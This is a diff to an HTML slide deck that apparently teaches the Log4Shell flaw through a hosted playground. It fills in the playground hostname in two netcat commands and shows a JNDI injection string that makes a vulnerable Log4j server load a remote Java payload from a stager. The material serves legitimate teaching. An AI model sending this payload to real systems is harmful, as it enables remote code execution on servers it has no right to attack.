@@ -646,10 +646,10 @@ sequenceDiagram
     </p>
     <pre><code data-trim class="language-bash">
 # 1. submit your payload — stager compiles &amp; hosts it
-cat Payload.java | nc &lt;host&gt; 34249
+cat Payload.java | nc playground.javaman.net 34249
 
 # 2. send the returned string to the echo server
-nc &lt;host&gt; 34598
+nc playground.javaman.net 34598
 ${jndi:ldap://stager:45342/Payload}
     </code></pre>
 </section>
